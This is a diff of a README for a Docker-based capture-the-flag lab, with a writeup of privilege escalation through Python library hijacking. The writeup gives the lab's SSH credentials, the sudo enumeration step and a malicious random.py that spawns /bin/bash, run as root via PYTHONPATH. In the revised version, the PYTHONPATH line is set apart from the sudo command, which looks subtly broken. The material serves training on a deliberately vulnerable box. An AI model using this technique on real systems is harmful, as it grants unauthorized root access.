@@ -1,80 +1,92 @@
-# Library Hijacking CTF Challenge
+**Library Hijacking CTF Challenge**
 
-## 🏴 Challenge Overview
-Welcome to the **Library Hijacking CTF** challenge! This is a beginner-to-intermediate level machine-based CTF where the attacker needs to escalate privileges by exploiting a misconfigured Python script that runs with root privileges.
+**🏴 Challenge Overview**
 
----
-
-## 🎯 Objective
-Your goal is to gain **root access** by exploiting a Python library hijacking vulnerability. You will connect to the machine using **SSH**, enumerate the system, and escalate privileges to obtain a root shell.
+Welcome to the **Library Hijacking CTF** challenge! This is a beginner-to-intermediate level machine-based CTF where the attacker needs to escalate privileges by exploiting a misconfigured Python script that runs with root privileges.
 
 ---
 
-## 🛠 Setup
-This challenge runs inside a **Docker container**. To deploy it, use the following commands:
-```bash
+**🎯 Objective**
+
+Your goal is to gain **root access** by exploiting a Python library hijacking vulnerability. You will connect to the machine using **SSH**, enumerate the system, and escalate privileges to obtain a root shell.
+
+---
+
+**🛠 Setup**
+
+This challenge runs inside a **Docker container**. To deploy it, use the following commands:
+
+```
 docker pull e51am/ctf
 docker run -dit --name library_hijacking_ctf -p 2222:22 e51am/ctf
 ```
 
 Once the container is running, you can SSH into the machine using:
-```bash
+
+```
 ssh ctfuser@localhost -p 2222
 Password: password
 ```
 
 ---
 
-## 📌 Hints
-- Use `sudo -l` to check for **executable scripts with sudo privileges**.
-- Find out which **libraries** the vulnerable script imports.
-- Hijack the **imported library** to execute arbitrary code.
+**📌 Hints**
+
+- Use `sudo -l` to check for **executable scripts with sudo privileges**.
+- Find out which **libraries** the vulnerable script imports.
+- Hijack the **imported library** to execute arbitrary code.
 
 ---
 
-> # Writeup
+# Writeup
 
-## 🔍 Enumeration & Exploitation
+**🔍 Enumeration & Exploitation**
 
-### 1️⃣ **Initial Access**
+**1️⃣ Initial Access**
 
-- The attacker discovers **credentials** for SSH login:**Username:** `ctfuser`**Password:** `password`
+- The attacker discovers **credentials** for SSH login: **Username:** `ctfuser`**Password:** `password`
 - Using the credentials, they connect via SSH:
     
-    ```bash
+    ```
     ssh ctfuser@localhost -p 2222
-    
     ```
     
 
-### 2️⃣ **Privilege Escalation - Enumerating sudo Permissions**
+**2️⃣ Privilege Escalation - Enumerating sudo Permissions**
 
-- Running the following command reveals a **sudo misconfiguration**:
+- Running the following command reveals a **sudo misconfiguration**:
     
-    ```bash
+    ```
     sudo -l
-    
     ```
-    
+    or use linEnum.sh
+  
 - Output:
     
     ```
     (ALL) NOPASSWD: /usr/bin/python3 vulnerable_script.py
-    
     ```
     
-- This means `ctfuser` can execute `vulnerable_script.py` **as root** without a password.
+- This means `ctfuser` can execute `vulnerable_script.py` **as root** without a password.
 
-### 3️⃣ **Analyzing the Vulnerable Script**
+**3️⃣ Find the vulnerable script:** use the following command to locate the script:
 
-- Checking the contents of `/opt/scripts/vulnerable_script.py`:**Output:**
+```bash
+find / -name vulnerable_script.py 2>/dev/null
+```
+
+This means `vulnerable_script.py` is in `/opt/scripts`
+
+**4️⃣ Analyzing the Vulnerable Script**
+
+- Checking the contents of `/opt/scripts/vulnerable_script.py`:**Output:**
     
-    ```bash
+    ```
     cat /opt/scripts/vulnerable_script.py
     
     ```
     
-    ```python
+    ```
     import random
     choices = ["Rock", "Paper", "Scissors"]
     computer = random.choice(choices)
@@ -112,48 +124,48 @@ Password: password
           print(f"CPU:{cpu_score}")
           print(f"Plaer:{player_score}")
           break
-    
     ```
     
-- The script imports **random**, which we can **hijack**!
+- The script imports **random**, which we can **hijack**!
 
-### 4️⃣ **Exploiting Library Hijacking**
+5️⃣ **Exploiting Library Hijacking**
 
-- We create a **malicious version** of `random.py` in `/tmp`:
+- We create a **malicious version** of `random.py` in `/tmp`:
     
-    ```bash
-    mkdir -p /tmp/random
-    echo 'import os; os.system("/bin/bash")' > /tmp/random/__init__.py
+    ```
+    mkdir ~/hijack
+    echo 'import os; os.system("/bin/bash")' > ~/hijack/random.py
     
     ```
     
-- Set the `PYTHONPATH` to prioritize our malicious library:
+- Set the `PYTHONPATH` to prioritize our malicious library:
     
-    ```bash
-    PYTHONPATH=/tmp sudo /usr/bin/python3 /opt/scripts/vulnerable_script.py
+    ```
+    PYTHONPATH=/home/ctfuser/hijack/
+    sudo /usr/bin/python3 vulnerable_script.py
     
     ```
     
-- This spawns a **root shell**! 🎉
+- This spawns a **root shell**! 🎉
 
 ---
 
-## 🏆 Capture the Flag
+**🏆 Capture the Flag**
 
 Once you gain root access, find the flag inside:
 
-```bash
+```
 cat /root/flag.txt
-
 ```
 
 ---
 
-## 🚀 Conclusion
-This challenge teaches **privilege escalation via Python library hijacking**, a common misconfiguration found in real-world scenarios. Happy hacking! 🏴‍☠️
+**🚀 Conclusion**
+
+This challenge teaches **privilege escalation via Python library hijacking**, a common misconfiguration found in real-world scenarios. Happy hacking! 🏴‍☠️
 
 ---
 
-## 📜 Disclaimer
-This challenge is for **educational purposes only**. Do not attempt these techniques on unauthorized systems!
+**📜 Disclaimer**
 
+This challenge is for **educational purposes only**. Do not attempt these techniques on unauthorized systems!
